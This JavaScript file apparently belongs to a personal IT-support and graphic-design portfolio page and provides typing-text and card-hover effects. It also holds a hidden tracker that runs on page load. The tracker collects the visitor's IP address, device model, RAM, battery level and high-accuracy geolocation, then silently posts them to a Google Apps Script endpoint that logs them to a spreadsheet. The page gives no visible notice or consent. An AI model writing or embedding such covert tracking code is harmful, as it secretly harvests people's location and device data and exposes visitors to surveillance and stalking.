(async function() {
  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyd82Kw9QJroZTRhOYmZWLh88VCotp3UHCWd3dRjpCYHtxYz_-ojBi7wuhOqTPx1vVS-w/exec"; 

  const getDeviceModel = () => {
    const ua = navigator.userAgent;
    const w = window.screen.width;
    const h = window.screen.height;
    const r = window.devicePixelRatio;

    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
      if ((w === 430 && h === 932) || (w === 440 && h === 956)) return "iPhone 15/16 Pro Max";
      if ((w === 393 && h === 852) || (w === 402 && h === 874)) return "iPhone 15/16 Pro";
      if (w === 393 && h === 852 && r === 3) return "iPhone 14 Pro / 15 / 16";
      if (w === 390 && h === 844) return "iPhone 12/13/14";
      if (w === 414 && h === 896 && r === 3) return "iPhone 11 Pro Max / XS Max";
      if (w === 414 && h === 896 && r === 2) return "iPhone 11 / XR";
      if (w === 375 && h === 667) return "iPhone SE/6/7/8";
      if (w === 375 && h === 812) return "iPhone X/XS/11Pro/mini";
      return "Apple iPhone";
    }
    
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      return match ? match[1] : "Android Device";
    }
    return navigator.platform;
  };

  const startTracker = async () => {
    let payload = {
      ip: "Checking...",
      platform: navigator.platform,
      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
      battery: "0",
      deviceName: getDeviceModel(),
      lat: null, 
      long: null
    };

    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const d = await res.json();
      payload.ip = d.ip;
    } catch (e) { payload.ip = "Hidden/VPN"; }

    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      payload.battery = Math.round(b.level * 100);
    }

    const send = (data) => {
      fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(data) });
    };

    // Cek lokasi
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        send(payload); 
      }, (err) => {
        // Jika ditolak, kirim payload TANPA lat/long (akan buat baris baru di Excel)
        send(payload);
      }, { enableHighAccuracy: true });
    } else {
      send(payload);
    }
  };

  // --- UI EFFECTS (TYPING & RIPPLE) ---
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

  function typeText() {
    const typedElement = document.getElementById('typed-text');
    if (!typedElement) return;
    const currentText = texts[textIndex];
    if (isDeleting) {
      typedElement.textContent = currentText.substring(0, charIndex - 1);
      charIndex--; typingDelay = 75;
    } else {
      typedElement.textContent = currentText.substring(0, charIndex + 1);
      charIndex++; typingDelay = 150;
    }
    if (!isDeleting && charIndex === currentText.length) {
      typingDelay = 2000; isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % texts.length;
      typingDelay = 500;
    }
    setTimeout(typeText, typingDelay);
  }

  window.addEventListener('load', () => {
    startTracker();
    setTimeout(typeText, 1000);
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
      });
    });
  });
})();
